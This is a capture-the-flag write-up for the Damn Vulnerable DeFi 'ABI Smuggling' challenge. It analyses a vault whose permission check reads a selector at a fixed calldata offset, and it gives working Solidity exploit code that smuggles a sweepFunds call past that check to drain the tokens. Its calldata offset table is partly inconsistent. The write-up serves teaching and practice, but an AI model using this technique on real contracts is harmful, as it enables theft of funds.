## [ABI Smuggling](https://www.damnvulnerabledefi.xyz/challenges/abi-smuggling/)



```solidity
contract ABISmugglingChallenge is Test {
  // [...]
  function setUp() public {
    startHoax(deployer);

    // Deploy token
    token = new DamnValuableToken();

    // Deploy vault
    vault = new SelfAuthorizedVault();

    // Set permissions in the vault
    bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
    bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
    bytes32[] memory permissions = new bytes32[](2);
    permissions[0] = deployerPermission;
    permissions[1] = playerPermission;
    vault.setPermissions(permissions);

    // Fund the vault with tokens
    token.transfer(address(vault), VAULT_TOKEN_BALANCE);

    vm.stopPrank();
  }
  // [...]
  function _isSolved() private view {
    // All tokens taken from the vault and deposited into the designated recovery account
    assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
    assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
  }
}
```

### Analysis

The `SelfAuthorizedVault::sweepFunds` function allows us to transfer all tokens from the `SelfAuthorizedVault` contract to `recovery`. However, it has the `onlyThis` modifier, which restricts the function to being invoked only by the contract itself. Fortunately, we have the `AuthorizedExecutor::execute` function to do the job.

```solidity
contract SelfAuthorizedVault is AuthorizedExecutor {
  // [...]
  function sweepFunds(address receiver, IERC20 token) external onlyThis {
    SafeTransferLib.safeTransfer(address(token), receiver, token.balanceOf(address(this)));
  }
  // [...]
}
```

#### `AuthorizedExecutor::execute`

The `AuthorizedExecutor::execute` function has one restriction: it only allows `bytes4(calldataload(calldataOffset))` to be the specific value, though it does not have any effect. Let us prepare our payload.

```solidity
abstract contract AuthorizedExecutor is ReentrancyGuard {
  function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
    // Read the 4-bytes selector at the beginning of `actionData`
    bytes4 selector;
    uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
    assembly {
      selector := calldataload(calldataOffset)
    }

    if (!permissions[getActionId(selector, msg.sender, target)]) {
      revert NotAllowed();
    }

    _beforeFunctionCall(target, actionData);

    return target.functionCall(actionData);
  }
}
```

We call the `AuthorizedExecutor::execute` function using the following calldata:

| The execute `selector` ([:4]) | `address target` ([4:4+32]) | `bytes actionData` offset ([36:36+32]) | Whatever ([66:66+32]) | The `selector` being checked ([98:98+4]) | `bytes actionData` length ([102:102+32]) | `bytes actionData`  data ([134:]) |
| ----------------------------- | --------------------------- | -------------------------------------- | --------------------- | ---------------------------------------- | ---------------------------------------- | --------------------------------- |
| (the `execute` selector)      | (`address(vault)`)          | 0x64                                   | 0                     | `bytes4(hex"d9caed12")`                  | `sweepFundsCallData.length`              | `sweepFundsCallData`              |

The `selector` being checked passes the permissions check, while the `actionData` argument is decoded as our `sweepFundsCallData`.

For more information on how Solidity decodes bytes calldata, see [Solidity ABI Specification](https://docs.soliditylang.org/en/latest/abi-spec.html#use-of-dynamic-types).

### Solution

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
  bytes memory sweepFundsCallData = abi.encodePacked(vault.sweepFunds.selector, uint256(uint160(recovery)), uint256(uint160(address(token))));
  bytes memory executeCallData = abi.encodePacked(
    vault.execute.selector,
    uint256(uint160(address(vault))),
    uint256(0x64),
    uint256(0),
    bytes4(hex"d9caed12"),
    sweepFundsCallData.length,
    sweepFundsCallData
  );
  (bool success, ) = address(vault).call(executeCallData);
  require(success, "Call failed");
}
```

Full solution can be found in [ABISmuggling.t.sol](./ABISmuggling.t.sol#L75).